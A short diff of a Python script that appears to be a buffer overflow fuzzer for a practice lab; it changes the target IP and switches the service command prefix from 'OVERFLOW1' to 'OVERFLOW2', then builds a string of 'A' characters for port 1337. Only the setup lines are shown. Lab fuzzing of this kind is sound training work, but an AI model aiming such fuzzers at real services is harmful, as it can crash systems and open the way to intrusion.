@@ -2,12 +2,12 @@
 
 import socket, time, sys
 
-ip = "10.10.83.110"
+ip = "10.10.98.11"
 
 port = 1337
 
 timeout = 5
-prefix = "OVERFLOW1 "
+prefix = "OVERFLOW2 "
 string = prefix + "A" * 100
 
 while True:
